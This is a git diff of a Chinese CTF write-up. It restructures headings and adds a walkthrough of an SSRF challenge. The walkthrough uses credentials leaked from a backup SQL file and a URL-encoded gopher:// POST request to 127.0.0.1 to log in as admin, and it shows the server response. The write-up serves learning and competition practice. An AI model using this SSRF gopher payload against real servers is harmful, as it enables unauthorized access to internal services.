@@ -1,6 +1,6 @@
-## WEB
+# WEB
 
-### are you in class (260)
+## are you in class (260)
 
 >就是签到题
 >
@@ -44,7 +44,7 @@ You are not in ClA55!!!!, You are hanging outside!!!
 
 由hint可知，在header添加XFF字段，值为192.168.1.1，得到flag
 
-### Buy Flag (650)
+## Buy Flag (650)
 
 > flag只有小朋友能买，你只能偷
 
@@ -136,7 +136,7 @@ for i in range(1, 65):
                 continue
 ```
 
-### easy_upload (928)
+## easy_upload (928)
 
 > 上，上传
 > hint1：we check type, name and the first line of the file
@@ -152,15 +152,138 @@ for i in range(1, 65):
 
 由 `I need a python file!` 以及 `the first line of the file` ，将文件首行改为 `#!/usr/bin/python` ，显示 `good~ now back to the store` ，再上传一次，积分就够买flag了 `TSCTF{upload_upload233}`
 
-## Misc
+## Emmm (x)
 
-### 我需要治疗 (191)
+赛后要了无数hint后做出来的（手动捂脸
+
+### Begin
+
+> hint : 仔细观察你目前得到的信息
+
+![login](images/login.jpg)
+
+尝试用admin弱密钥登陆无果，注册了个admin并登陆，跳转至测试系统
+
+![content](images/content.jpg)
+
+![test](images/test.jpg)
+
+提交url后，服务器请求并在页面上返回内容，起初以为是XSS，然而请求content页面返回空，请求login才有返回，并且请求xss页面时发现它并不解析前端js代码，只是获取网页后端的源代码，故这里是 [SSRF](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/) （由服务器端发起请求的一个漏洞），同时查看HTTP Header可知服务器的系统以及php版本 `Server: Apache/2.4.10 (Debian) PHP/5.6.19` 
+
+### SSRF
+
+SSRF有三种协议可以利用，分别是DICT、Gopher、File，尝试提交 `file:///var/www/html/index.php` ，没有返回值，猜测File协议不可用。网上资料中对SSRF的讲解差不多可分为对Redis的利用以及Gopher协议的各种骚操作，两者是否开启可在 `phpinfo()` 中查看
+
+用burpsuite扫描网站，扫描到 `/backup/2016_db.sql` 、 `/phpinfo.php` 、 `/config.php` 。phpinfo.php中开启了Gopher，没有Redis，故本题应用Gopher骚操作；同时让服务器请求phpinfo，发现没有cookie，确认请求只有后端。config.php应该只是存放网站配置，并没有内容。
+
+```sql
+# /backup/2016_db.sql
+SET FOREIGN_KEY_CHECKS=0;
+-- ----------------------------
+-- Table structure for flag
+-- ----------------------------
+DROP TABLE IF EXISTS `flag`;
+CREATE TABLE `flag` (
+  `flag` varchar(255) DEFAULT NULL
+) ENGINE=MyISAM DEFAULT CHARSET=utf8;
+-- ----------------------------
+-- Records of flag
+-- ----------------------------
+INSERT INTO `flag` VALUES ('BUPT{xxxxxxxxxxxxxxx}');
+
+-- ----------------------------
+-- Table structure for users
+-- ----------------------------
+DROP TABLE IF EXISTS `users`;
+CREATE TABLE `users` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
+  `username` varchar(255) DEFAULT NULL,
+  `password` varchar(255) DEFAULT NULL,
+  `is_admin` int(11) DEFAULT NULL,
+  PRIMARY KEY (`id`)
+) ENGINE=MyISAM AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
+-- ----------------------------
+-- Records of users
+-- ----------------------------
+INSERT INTO `users` VALUES ('1', 'admin', MD5('bupt666'), '1');
+```
+
+本来以为密码是 `bupt666` 的md5值，登不进以为这里有坑琢磨了很久，结果密码就是 `bupt666` 233。
+
+```
+Warning! login failed! admin's login ip must be 127.0.0.1 (attention: http server's local port is 80)!
+```
+
+根据错误提示，第一反应是XFF之类的HTTP Header来一套，然而签到题就是XFF，不可能这里还是XFF，故应通过SSRF登陆，即通过Gopher发送Post请求。
+
+### Gopher Post
+
+Gopher协议发送Post请求，格式是把Post数据包放在 `gopher://ip:port/_POST ...` 之后，由于Gopher协议没有默认端口，所以不可省略，换行使用CRLF。gopher协议在收到数据包后，会进行url解码后解析，所以数据包需要经过url编码。
+
+```http
+POST /index.php?action=login HTTP/1.1
+Host: 127.0.0.1
+Content-Length: 31
+Content-Type: application/x-www-form-urlencoded
+Accept: */*
+Connection: close
+
+username=admin&password=bupt666
+```
+
+抓取登陆的POST包并简化，这里需要将Cookie删掉，因为登录状态会强制跳转至content，不可重新登录。
+
+
+然后对这个包进行url编码，安利VScode中的 `Encode Decode` 扩展，可以很方便地进行各种编码转换。
+
+```
+POST%20%2Findex.php%3Faction%3Dlogin%20HTTP%2F1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Length%3A%2031%0D%0AContent-Type%3A%20application%2Fx-www-form-urlencoded%0D%0AAccept%3A%20*%2F*%0D%0AConnection%3A%20close%0D%0A%0D%0Ausername%3Dadmin%26password%3Dbupt666
+```
+
+提交 `gopher://127.0.0.1:80/_` + Post数据包，即可成功登录管理员账号。如果想直接在Burp中提交，则将 `gopher://127.0.0.1:80/_` + Post数据包，再进行一次url编码。
+
+```http
+HTTP/1.1 302 Found
+Date: Tue, 29 May 2018 16:20:44 GMT
+Server: Apache/2.4.10 (Debian) PHP/5.6.19
+X-Powered-By: PHP/5.6.19
+Set-Cookie: PHPSESSID=4478cd71d1203359ef87dec71c67417c; path=/
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
+Pragma: no-cache
+Location: index.php?action=content
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=utf-8
+```
+
+若是成功登录，则会跳转至content，如上；若是密码错误，则会回显 `login failed! username/password error` ；若是参数有误，则可能跳转至login。
+
+将自己的SessionID改为返回的ID，即可在content页面看到flag `TSCTF{ssrf_with_gopher_is_amazing}` 
+
+### Reference
+
+第一次接触SSRF，很多地方讲述不清，可以看下我学习时查阅的资料~
+
+[SSRF 服务端请求伪造](https://ctf-wiki.github.io/ctf-wiki/web/ssrf/)
+
+[SSRF漏洞的利用与学习](https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html)
+
+[weblogic_ssrf入侵redis测试](https://_thorns.gitbooks.io/sec/content/weblogicssrf_ru_qin_redis_ce_shi.html) （非本题知识点）
+
+[利用 Gopher 协议拓展攻击面](https://blog.chaitin.cn/gopher-attack-surfaces/)
+
+[使用gopher协议构造post包的方法](https://www.th1s.cn/index.php/2016/10/31/15.html)
+
+# Misc
+
+## 我需要治疗 (191)
 
 > 到天枢Dubhe公众号，开启你的踢诶斯吸踢诶腐之旅！VFNDVEZ7SV9OMzNkX0hlQTFpTmd9(==)
 
 Base64解码 `TSCTF{I_N33d_HeA1iNg}` ，发送至公众号后台得flag `TSCTF{iT_15_HiiiigH_NO0n}`
 
-### 简单的RSA (406)
+## 简单的RSA (406)
 
 > 这是一道简单的RSA
 >
@@ -197,9 +320,9 @@ d = gmpy2.invert(e, (p-1)*(q-1))
 
 ![rsa_calculate](images/rsa_calculate.jpg)
 
-## Coding
+# Coding
 
-### gobang (406)
+## gobang (406)
 
 > Can you play gobang with me? 10.112.108.77 1113
 
@@ -251,7 +374,7 @@ Your move (u:undo, q:quit):
 
 五子棋，总时间不限，每步有时限。尝试人工下的过程中，发现如果一直输入已有棋子的坐标，可以无限延长该步的时间，然后就拖时间慢慢下完了...
 
-### Zelda (619)
+## Zelda (619)
 
 > 10.112.108.77 1111
 
@@ -438,7 +561,7 @@ sock.close()
 time.sleep(0.001)
 ```
 
-### ballgame (812)
+## ballgame (812)
 
 > Strongest Collision 10.112.108.77 1112
 
